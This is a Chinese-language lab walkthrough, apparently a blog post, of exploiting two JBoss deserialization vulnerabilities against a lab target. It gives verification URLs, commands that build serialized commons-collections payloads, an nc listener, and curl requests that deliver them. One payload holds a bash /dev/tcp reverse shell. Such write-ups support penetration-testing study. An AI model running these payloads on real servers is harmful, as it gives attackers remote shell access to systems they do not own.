##### CVE-2017-7504 反序列化

访问/jbossmq-httpil/HTTPServerILServlet，出现如下页面证明存在该漏洞

![](https://image.3001.net/images/20220908/1662637492_6319d5b41c503b6238fad.png!small)

编译并生成序列化文件

    
    
    javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java
    

![](https://image.3001.net/images/20220908/1662637541_6319d5e584d47c396d399.png!small)

生成带有序列化恶意数据的ser文件

    
    
    java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap "bash -i >& /dev/tcp/192.168.103.134/4444 0>&1"
    

![](https://image.3001.net/images/20220908/1662637664_6319d660063729ce5626e.png!small)

开启nc监听

![](https://image.3001.net/images/20220908/1662637682_6319d6728053b72490ec4.png!small)

向靶机发送攻击payload

    
    
    curl http://192.168.103.134:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ExampleCommonsCollections1WithHashMap.ser
    

![](https://image.3001.net/images/20220908/1662637721_6319d699d3512260df611.png!small)

成功反弹

![](https://image.3001.net/images/20220908/1662637734_6319d6a6dc4fdde51e7f9.png!small)

##### CVE-2017-12149 反序列化

验证漏洞:访问/invoker/readonly，状态码为500,说明存在该漏洞

![](https://image.3001.net/images/20220908/1662637753_6319d6b909250e8ddedfa.png!small)

编译并生成序列化文件

    
    
    javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
    

![](https://image.3001.net/images/20220908/1662637774_6319d6ce4ccc8c1efa21f.png!small)

生成带有序列化恶意数据的ser文件

    
    
    java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.103.227:4444
    

![](https://image.3001.net/images/20220908/1662637794_6319d6e2c29733ec93ad8.png!small)

nc监听端口

    
    
    nc -lvnp 4444
    

![](https://image.3001.net/images/20220908/1662637825_6319d7010172bab16cbdd.png!small)

向靶机发送攻击payload

    
    
    curl http://192.168.103.134:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser
    

![](https://image.3001.net/images/20220908/1662637844_6319d7146ddeb27154237.png!small)

成功反弹

![](https://image.3001.net/images/20220908/1662637859_6319d723778e362c88578.png!small)

